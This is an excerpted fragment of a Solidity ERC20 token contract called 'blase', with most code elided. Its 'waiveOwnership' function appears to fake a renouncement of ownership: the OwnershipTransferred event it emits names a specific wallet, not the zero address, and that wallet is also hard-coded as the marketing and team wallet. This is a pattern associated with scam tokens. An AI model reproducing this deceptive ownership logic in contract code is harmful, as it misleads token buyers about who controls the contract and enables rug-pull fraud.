...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x1B00e920426358443DB8897861888eAC48cA1273));
...
contract blase is Context, IERC20, Ownable {
    ...
    string private _symbol =unicode"blase湾湾";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1B00e920426358443DB8897861888eAC48cA1273);
    address payable public teamWalletAddress = payable(0x1B00e920426358443DB8897861888eAC48cA1273);
